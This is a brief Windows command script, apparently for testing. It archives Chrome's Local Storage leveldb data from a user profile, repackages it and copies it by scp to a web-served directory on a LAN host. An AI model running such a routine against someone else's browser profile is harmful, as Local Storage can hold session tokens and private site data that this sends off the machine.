cd C:\Users\DVC_volunteer\AppData\Local\Google\Chrome
tar -c -f C:\Users\DVC_volunteer\Downloads\UserDataStart.tar "User Data\Default\Local Storage\leveldb"
cd C:\Users\DVC_volunteer\Downloads
rm -r temp
mkdir temp
cd temp
tar -x -f ..\UserDataStart.tar
pushd "User Data"
popd
tar -c -v -z -f UserData.test.tgz "User Data"
scp UserData.test.tgz guy@192.168.1.193:/var/www/html
